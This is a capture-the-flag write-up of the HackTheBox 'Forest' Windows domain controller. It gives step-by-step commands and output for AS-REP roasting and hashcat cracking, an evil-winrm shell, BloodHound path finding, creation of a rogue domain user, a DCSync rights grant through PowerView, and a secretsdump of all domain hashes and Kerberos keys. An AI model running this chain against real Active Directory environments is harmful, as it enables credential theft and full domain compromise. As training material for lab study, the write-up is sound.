Box: Windows
Level: Easy
### Index
1. Initial Nmap Enumeration
2. Port 53 - Simple DNS Plus - Nothing Work
3. Port 139,445 - Samba
	 3.1 Got the list of Valid Users
	 3.2 krbtgt Account Was Disabled
	 3.3 Operating System Details
	 3.4 Ran SMB-Vuln Scan using Nmap and the box was not vulnerable with any SMB vulnerability
4. Port 389, 636, 3268, 3269 -  LDAP
	4.1  jxplorer - ldapsearch alternative and a GUI tool on Kali to explore the domain
	4.2  AS-REP Roasting - Kerberos Pre-Authentication Disabled. (Read [My Blog](https://vandanpathak.com/htb-writeups/as-rep-roasting-and-forest-htb/)) 
	4.3  Evil-WinRM connect and give a shell using port 5985 by default
	4.2  Getting WinRM shell using svc-alfresco account
5.  Privilege Escalation using winPEAS 
6.  Privilege Escalation using BloodHound
	6.1  Using **Shortest Path From Owned Principal** 
	6.2  Attack Plan
7. Let's Attack
	7.1  Creating new user
	7.2  Adding new user to **Exchange Windows Permission Group**
	7.3  Installing PowerSploit on the Target (Optional)
	7.4  Dumping the secrets using impacket-secretdump
8.  Lesson Learned
	8.1  DcSync Attack

	
### Initial Nmap Enumeration
```
$ nmap -p- --min-rate=1000 -Pn -T4 -sC -sV 10.10.10.161
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-11 15:28 EDT
Nmap scan report for forest.htb (10.10.10.161)
Host is up (0.068s latency).
Not shown: 65511 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-11 19:36:09Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
49965/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-08-11T19:37:01
|_  start_date: 2024-08-11T19:11:25
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-08-11T12:37:04-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h26m48s, deviation: 4h02m32s, median: 6m46s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.03 seconds
```

Host Details Obtained using smb scan
```
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-08-11T21:05:32-07:00
```
#### Strategy
1. Enumerate each port with services and their exploit really well. Lot of ports are open so plan accordingly 

### Port 53 - Simple DNS Plus

```
$ nmap -p53 --script=dns-* -sV -sC -Pn 10.10.10.161
PORT   STATE SERVICE VERSION
53/tcp open  domain  Simple DNS Plus
| dns-nsec3-enum: 
|_  DNSSEC NSEC3 not supported
| dns-nsec-enum: 
|_  No NSEC records found
|_dns-fuzz: Server didn't response to our probe, can't fuzz
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| dns-blacklist: 
|   SPAM
|     l2.apews.org - FAIL
|_    sbl.spamhaus.org - FAIL
| dns-brute: 
|_  DNS Brute-force hostnames: No results.
```

Nothing Interesting. I found one DoS attack for the Simple DNS Plus which basically stop the DNS service on the target. Our goal here is not to stop any service.

### Port 139, 445 - microsoft-ds

Enumerating SMB
```
$ nmap -p445 --script=smb-* -sV -sC -Pn 10.10.10.161
PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)

|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

|_smb-mbenum: 
|_  ERROR: Call to Browser Service failed with status = 2184
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-08-11T21:05:32-07:00

| smb-enum-users: # ...............................VALID LIST OF USERS OBTAINED FROM THIS SMB_ENUM_USERS NSE SCRIPT........................
|   HTB\$331000-VK4ADACQNUCA (RID: 1123)                                                               
|     Flags:       Account disabled, Password not required, Password Expired, Normal user account
|   HTB\Administrator (RID: 500)
|     Full name:   Administrator
|     Description: Built-in account for administering the computer/domain
|     Flags:       Normal user account
|   HTB\andy (RID: 1150)
|     Full name:   Andy Hislip
|     Flags:       Password does not expire, Normal user account
|   HTB\DefaultAccount (RID: 503)
|     Description: A user account managed by the system.
|     Flags:       Account disabled, Password not required, Password does not expire, Normal user account
|   HTB\Guest (RID: 501)
|     Description: Built-in account for guest access to the computer/domain
|     Flags:       Account disabled, Password not required, Password does not expire, Normal user account
|   HTB\HealthMailbox0659cc1 (RID: 1144)
|     Full name:   HealthMailbox-EXCH01-010
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailbox670628e (RID: 1137)
|     Full name:   HealthMailbox-EXCH01-003
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailbox6ded678 (RID: 1139)
|     Full name:   HealthMailbox-EXCH01-005
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailbox7108a4e (RID: 1143)
|     Full name:   HealthMailbox-EXCH01-009
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailbox83d6781 (RID: 1140)
|     Full name:   HealthMailbox-EXCH01-006
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailbox968e74d (RID: 1138)
|     Full name:   HealthMailbox-EXCH01-004
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailboxb01ac64 (RID: 1142)
|     Full name:   HealthMailbox-EXCH01-008
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailboxc0a90c9 (RID: 1136)
|     Full name:   HealthMailbox-EXCH01-002
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailboxc3d7722 (RID: 1134)
|     Full name:   HealthMailbox-EXCH01-Mailbox-Database-1118319013
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailboxfc9daad (RID: 1135)
|     Full name:   HealthMailbox-EXCH01-001
|     Flags:       Password does not expire, Normal user account
|   HTB\HealthMailboxfd87238 (RID: 1141)
|     Full name:   HealthMailbox-EXCH01-007
|     Flags:       Password does not expire, Normal user account
|   HTB\krbtgt (RID: 502)                          # ................................ NOTICE THAT KRBTGT ACCOUNT IS DISABLED........................
|     Description: Key Distribution Center Service Account
|     Flags:       Account disabled, Normal user account
|   HTB\lucinda (RID: 1146)
|     Full name:   Lucinda Berger
|     Flags:       Password does not expire, Normal user account
|   HTB\mark (RID: 1151)
|     Full name:   Mark Brandt
|     Flags:       Password does not expire, Normal user account
|   HTB\santi (RID: 1152)
|     Full name:   Santi Rodriguez
|_    Flags:       Password does not expire, Normal user account

| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.10.10.161\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.161\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.10.161\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: READ
|   \\10.10.10.161\NETLOGON: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: <none>

```

From the smb-enum-users NSE Script, We have obtained the following valid/enabled user accounts
HTB\\Administrator, HTB\\andy,  HTB\\HealthMailboxnnnn Acccounts, HTB\\lucinda, HTB\\mark,  HTB\\santi
No shares has the anonymous access enabled. 

### Port 389, 636, 3268, 3269 -  LDAP

The default port for LDAP Unencrypted is 389 and 636 for LDAP Over TLS-Encrypted channel. LDAP In Active Directory Port 3268 for Unencrypted LDAP and 3269 for LDAP over TLS-Encrypted Channel.

During the enumeration, I have used the ldapsearch quite a few times. I got the list of valid users and one service account as well. But I wanted something that I can put into my notes so decided to use an alternative of ldapsearch which is jxplorer on kali linux. It is an open-source browser and can be install using apt-get install jxplorer. It is LDAP Browser. Here I found one service account through jxplorer. 

Connect the box using the following command and Hit OK
![](Pasted%20image%2020240812224515.png)

![](Pasted%20image%2020240812224726.png)

Couple of other important things to look for in ldapsearch. Not require for this box but would be helpful to know for future box.

Microsoft Exchange Security Group
![](Pasted%20image%2020240812225212.png)

The Service Account we saw in the above list is using [svc-alfresco](https://docs.alfresco.com/process-services/latest/config/authenticate/#kerberos-and-active-directory) is a service account which has the Kerberos Pre-Authentication disabled. We can use Impacket'GetNPUsers to extract the Kerberos Ticket for this service users.

> [!tip] Why we are able to request the ticket for the user svc-alfresco? Little Detail about AS-REP Roasting.
>  
> The Service user has Kerberos Pre-Authentication Disabled. Which means in some cases, there will be users who don’t have the Kerberos Pre-Authentication Attribute Enabled. This means that anyone can send a KRB_AS_REQ request to the DC on behalf of any of those users and receive the KRB_AS_REP from the KDC. In a real-world scenario, not all applications will support Kerberos pre-authentication, making it common to find users in the DC for whom Kerberos Pre-Authentication is disabled. This allows attackers to request TGTs for these users and crack their session key offline using tools like John or hashcat. This is known as AS-REPRoasting.

Now Trying Get-NPUsers to extract the ticket for the svc-alfresco user account.

```
Getting the Ticket

$ impacket-GetNPUsers htb.local/svc-alfresco -dc-ip 10.10.10.161 -no-pass
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB.LOCAL:95f126a5e225b3c565eb76ce698e7a2c$3f66335e0324e3bc866da21863a9179876e4ec511e5c5616b966f22dd053352f46630da75f3b297557307884ac7842ee333b8f7391c5a4b77876e03dd6de575ab18307e189f7498d4c89981cdd19b99e04108f45ba29d1321ea3c2229b0f28d22c42f3e4bb2c06d5c767a1de59262dddaa72fb3d43437f536abc865c4caa9329995f35bae330ba8ddf170563eeaf28de3fa4c23de06de1a9524c6fa409199032247f3782826ed24769d019e1572fd92aaeadc96c590df7027e606f915ca0a8564fbf10967f6eb2ec8df077b37a168021310f7277889e85b3475c5851081093b9aa14ed2d02cf

Copy the ticket into text file and run the hashcat 

$ hashcat -m 18200 -a 0 krgtgt.out /usr/share/wordlists/rockyou.txt 

$krb5asrep$23$svc-alfresco@HTB.LOCAL:95f126a5e225b3c565eb76ce698e7a2c$3f66335e0324e3bc866da21863a9179876e4ec511e5c5616b966f22dd053352f46630da75f3b297557307884ac7842ee333b8f7391c5a4b77876e03dd6de575ab18307e189f7498d4c89981cdd19b99e04108f45ba29d1321ea3c2229b0f28d22c42f3e4bb2c06d5c767a1de59262dddaa72fb3d43437f536abc865c4caa9329995f35bae330ba8ddf170563eeaf28de3fa4c23de06de1a9524c6fa409199032247f3782826ed24769d019e1572fd92aaeadc96c590df7027e606f915ca0a8564fbf10967f6eb2ec8df077b37a168021310f7277889e85b3475c5851081093b9aa14ed2d02cf:s3rvice

Look at the password s3rvice
```

###### evil-winrm connects on port 5985 by default

```
$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice                                       
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc-alfresco> cd Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
5b7********************************************
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> 
```

### Privilege Escalation using winPEAS

I got access denied for the most things when running winPEAS.bat. So I will need to find another way to find the path for the Privilege Escalation. 

### Privilege Escalation using BloodHound

So this time, I am using BloodHound and SharpHound to prepare the privilege escalation path. I will be writing this notes in little detail because I have played with BloodHound and I know the stress of it.  

Lets' first Download the [SharpHound.exe](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe) and get it on our target. Make sure to use exactly this link of SharpHound because BloodHound is compatible with only this particular EXE Version.
```
####### UPLOADING THE SharpHound.exe ON THE TARGET

*Evil-WinRM* PS C:\tmp> upload SharpHound.exe
Info: Uploading /home/ringbuffer/Downloads/Forest.htb/SharpHound.exe to C:\tmp\SharpHound.exe
Data: 1395368 bytes of 1395368 bytes copied                                    
Info: Upload successful!

####### RUNNING SharpHound.exe - NOTICE THE FIRST LINE. This Version of SharpHound is Compatible with 4.3.1 Release of BloodHound

*Evil-WinRM* PS C:\tmp> .\SharpHound.exe
2024-08-12T22:03:24.7901824-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound
2024-08-12T22:03:24.9464240-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-08-12T22:03:24.9776786-07:00|INFORMATION|Initializing SharpHound at 10:03 PM on 8/12/2024
2024-08-12T22:03:25.1964245-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for htb.local : FOREST.htb.local
2024-08-12T22:03:25.3214256-07:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2024-08-12T22:03:25.9308123-07:00|INFORMATION|Beginning LDAP search for htb.local
2024-08-12T22:03:26.1339403-07:00|INFORMATION|Producer has finished, closing LDAP channel
2024-08-12T22:03:26.1339403-07:00|INFORMATION|LDAP channel closed, waiting for consumers
2024-08-12T22:03:56.0246195-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 38 MB RAM
2024-08-12T22:04:11.3059140-07:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2024-08-12T22:04:11.3527774-07:00|INFORMATION|Output channel closed, waiting for output task to complete
2024-08-12T22:04:11.4465301-07:00|INFORMATION|Status: 161 objects finished (+161 3.577778)/s -- Using 47 MB RAM
2024-08-12T22:04:11.4465301-07:00|INFORMATION|Enumeration finished in 00:00:45.5370339
2024-08-12T22:04:11.5402761-07:00|INFORMATION|Saving cache with stats: 118 ID to type mappings.
 117 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2024-08-12T22:04:11.5559007-07:00|INFORMATION|SharpHound Enumeration Completed at 10:04 PM on 8/12/2024! Happy Graphing!

###### The Above Command Will Create a zip file in the same directory.

*Evil-WinRM* PS C:\tmp> dir
    Directory: C:\tmp
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/12/2024  10:04 PM          18513 20240812220410_BloodHound.zip
-a----        8/12/2024  10:04 PM          19538 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----        8/12/2024  10:02 PM        1046528 SharpHound.exe
-a----        8/12/2024   8:39 PM          36184 winPEAS.bat

####### DOWNLOAD THE ZIP FILE AND IMPORT IT IN BLOODHOUND

*Evil-WinRM* PS C:\tmp> download 20240812220410_BloodHound.zip
Info: Downloading C:\tmp\20240812220410_BloodHound.zip to 20240812220410_BloodHound.zip
Info: Download successful!
```

okay now we have our zip file. You can follow the tutorial on [ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux) on how to install BloodHound on your Kali. Basically you will need to install neo4j than reset the default password for the user neo4j and then run the bloodhound from the terminal. I already did it. Following to that, Click on the ***Upload Data*** from the top right corner icons and select your zip file. Now Let's Prepare the Privilege Escalation Path.

#### Using Shortest Path From Own Principal

Once the zip file is imported, Search for the user svc-alfresco in the top left corner and hit enter. Right Click on the user svc-alfresco and select **Marked User as owned**
![](Pasted%20image%2020240813022825.png)

From the Burger Icon on the top left corner, Select **Analysis** and user the **Shortest Paths** Click on **Shortest Path From Own Principal**. Now If the tiny windows/box pop up, select **HTB.LOCAL** and than select **SVC-ALFRESCO @ HTB.LOCAL**.. You will see a graph something like this.

![](Pasted%20image%2020240813023117.png)

Don't worry, i will break it down for you now.
1. SVC-ALFRESCO user is a member of **SERVICE ACCOUNT** Group. The Same user is also member of **PRIVILEGED IT ACCOUNTS** Group and **ACCOUNT OPERATOR** Group.
2. The **ACCOUNT OPERATOR** Group is a Windows Account and upon Digging on the [Microsoft Website](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators), I found the following for the **ACCOUNT OPERATOR** group.

![](Pasted%20image%2020240813224048.png)

3. So the **ACCOUNT OPERATOR** group **GRANTS LIMITED ACCOUNT CREATION PRIVILEGES TO A USER**. Therefore, our **SVC-ALFRESCO** user can create other user on the domain. 
4. Now looking at the bloodhound graph above, the **ACCOUNT OPERATOR** group has a **GenericAll** rights to the **EXCH01.HTB.LOCAL8**. 
5. The **EXCH01.HTB.LOCAL8** is a Exchange Windows Permission Security Group. The **ACCOUNT OPERATOR** group has a `GenericAll` rights to this group. **GenericAll** Is a permission that gives full rights to an active directory objects. If you have `GenericAll` on group object, you can add users to the group. Since the **SVC-ALFRESCO** user is a member of **ACCOUNT OPERATOR** group, it can modify the permission within **EXCHANGE WINDOWS PERMISSION GROUP**. 
6. Now Go back to the BloodHound and Run another query from the Analysis Tab. **Find Shortest Path to Domain Admins**. now you will see the graph like this.

![](Pasted%20image%2020240813224724.png)

7. The **ACCOUNT OPERATOR** has a **GenericAll** Privileges to the group **EXCHANGE WINDOWS PERMISSION** which has a **WriteDacl** permission to **HTB.Local**. This is an important thing to note here. 

##### Attack Plan
1. We will create a new user on the domain. This is possible because the user svc-alfresco is a member of the group **ACCOUNT OPERATOR**
2. Add the new user into **Exchange Windows Permission Group**. This is possible because the user svc-alfresco has the GenericAll rights Exchange Windows Permission Group.
3. Assign the DcSync Privileges. This is possible because the user is now part of **Exchange Windows Permission Group** which has **WriteDACL** permission on the HTB.Local Domain. 
4. Perform the DcSync Attack and dump the hashes of all the users in the domain.
5. Perform the Pass The Hash attack to get access to the administrator's account.

### Let's Attack

Creating New USer
```
*Evil-WinRM* PS C:\tmp> net user forest_pwn password /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\tmp> net users /domain
User accounts for \\
-------------------------------------------------------------------------------
$331000-VK4ADACQNUCA     Administrator            andy
DefaultAccount           forest_pwn               Guest
HealthMailbox0659cc1     HealthMailbox670628e     HealthMailbox6ded678
HealthMailbox7108a4e     HealthMailbox83d6781     HealthMailbox968e74d
HealthMailboxb01ac64     HealthMailboxc0a90c9     HealthMailboxc3d7722
HealthMailboxfc9daad     HealthMailboxfd87238     krbtgt
lucinda                  mark                     santi
sebastien                SM_1b41c9286325456bb     SM_1ffab36a2f5f479cb
SM_2c8eef0a09b545acb     SM_681f53d4942840e18     SM_75a538d3025e4db9a
SM_7c96b981967141ebb     SM_9b69f1b9d2cc45549     SM_c75ee099d0a64c91b
SM_ca8c2ed5bdab4dc9b     svc-alfresco
The command completed with one or more errors.
```

Adding the new user `forest_pwn` into **Exchange Windows Permission Group**. Look at the field name **Global Group Membership** in the `net user forest_pwn` command.

```
*Evil-WinRM* PS C:\tmp> net group "Exchange Windows Permissions" forest_pwn /add
The command completed successfully.

*Evil-WinRM* PS C:\tmp> net user forest_pwn
User name                    forest_pwn
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/13/2024 7:58:50 PM
Password expires             Never
Password changeable          8/14/2024 7:58:50 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.
```

Assigning the DcSync Privileges to `forest_pwn` user. In order to assign the DcSync Privileges, We will need to use the PowerShell script,[ PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1). Download the script, upload it to the target box. I have created a directory tmp under the C: Drive. So I will be uploading it to C:\\tmp\\

```
*Evil-WinRM* PS C:\tmp> upload PowerView.ps1
Info: Uploading /home/ringbuffer/Downloads/Forest.htb/PowerView.ps1 to C:\tmp\PowerView.ps1
Data: 1027036 bytes of 1027036 bytes copied
Info: Upload successful!

*Evil-WinRM* PS C:\tmp> Import-Module ./PowerView.ps1
*Evil-WinRM* PS C:\tmp> $pass = convertto-securestring 'password' -AsPlainText -Force
*Evil-WinRM* PS C:\tmp> $cred = New-Object System.Management.Automation.PSCredential('htb\forest_pwn', $pass)
*Evil-WinRM* PS C:\tmp> Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity forest_pwn -Rights DcSync

```

In order to make sure that the DcSync rights has been assigned to our newly created user, I will going to put PowerSploit in the `echo $Env:PATH` PowerShell Module Path Directory. You can Download the PowerSploit from [Here](https://github.com/PowerShellMafia/PowerSploit/releases/tag/v3.0.0). Download the Source Code (zip). Extract it and Get it on the Target under C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\ Directory.

```
*Evil-WinRM* PS C:\tmp> echo $Env:PATH
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\svc-alfresco\AppData\Local\Microsoft\WindowsApps
```

Use the Following Command and Verify if the user `forest_pwn` has the ObjectType set to `DS-Replication-Get-Changes`.
```
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents\WindowsPowerShell\Modules> Get-ObjectAcl -DistinguishedName "dc=htb,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}

InheritedObjectType   : All
ObjectDN              : DC=htb,DC=local
ObjectType            : DS-Replication-Get-Changes-All       # DS-Replication-Get-Changes-All Permission to forest_pwn User
IdentityReference     : HTB\forest_pwn
IsInherited           : False
ActiveDirectoryRights : ExtendedRight
PropagationFlags      : None
ObjectFlags           : ObjectAceTypePresent
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-3072663084-364016917-1341370565

InheritedObjectType   : All
ObjectDN              : DC=htb,DC=local
ObjectType            : DS-Replication-Get-Changes          # DS-Replication-Get-Changes Permission to forest_pwn User
IdentityReference     : HTB\forest_pwn
IsInherited           : False
ActiveDirectoryRights : ExtendedRight
PropagationFlags      : None
ObjectFlags           : ObjectAceTypePresent
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-3072663084-364016917-1341370565

InheritedObjectType   : All
ObjectDN              : DC=htb,DC=local
ObjectType            : DS-Replication-Get-Changes-In-Filtered-Set
IdentityReference     : HTB\forest_pwn
IsInherited           : False
ActiveDirectoryRights : ExtendedRight
PropagationFlags      : None
ObjectFlags           : ObjectAceTypePresent
InheritanceFlags      : None
InheritanceType       : None
AccessControlType     : Allow
ObjectSID             : S-1-5-21-3072663084-364016917-1341370565
```

Dumping the secrets using impacket-secretdump.

```
$ impacket-secretsdump htb.local/forest_pwn:password@10.10.10.161
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
forest_pwn:9601:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:51056ed9d0d34140b18ab115d70c3910:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
